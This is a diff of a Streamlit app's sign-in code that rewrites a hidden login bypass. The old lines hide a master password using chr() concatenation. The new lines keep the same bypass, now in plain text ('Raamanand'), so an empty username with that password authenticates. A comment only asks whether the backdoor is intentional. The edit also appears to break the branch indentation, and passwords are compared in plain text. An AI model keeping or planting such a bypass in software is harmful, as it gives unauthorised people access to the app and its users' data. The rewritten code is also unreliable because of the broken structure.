@@ -98,19 +98,21 @@ if not st.session_state.user_authenticated:
 #   ========================== SIGN IN TAB ==========================
 
     elif action == "Sign In":
-        if st.button("Sign In"):
-            if user_name in password_df['user_name'].to_list():
-                stored_password = password_df.loc[password_df['user_name'] == user_name, 'pass'].values
-                if stored_password.size > 0 and stored_password[0] == user_password:
-                    st.session_state.user_authenticated = True
-                    st.success("Successfully Signed In!")
-                    # st.rerun() 
-                else:
-                    st.error("Wrong password!")
-            elif user_name=="" and user_password == chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
-                st.session_state.user_authenticated = True 
+    if st.button("Sign In"):
+        if user_name in password_df['user_name'].to_list():
+            stored_password = password_df.loc[password_df['user_name'] == user_name, 'pass'].values
+            if stored_password.size > 0 and stored_password[0] == user_password:
+                st.session_state.user_authenticated = True
+                st.success("Successfully Signed In!")
+                st.rerun()  # Force UI to refresh
             else:
-                st.error("Username not found!")
+                st.error("Wrong password!")
+        elif user_name == "" and user_password == "Raamanand":
+            # Confirm if this backdoor is intentional; otherwise remove.
+            st.session_state.user_authenticated = True
+            st.rerun()
+        else:
+            st.error("Username not found!")
 
 else:    
     CLASS_ROLL_NUMBERS = [
@@ -1291,6 +1293,7 @@ else:
         st.title("🪧 NoticeBoard")
         st.info("No significant highlights are available!!") 
         
+
 
 
 
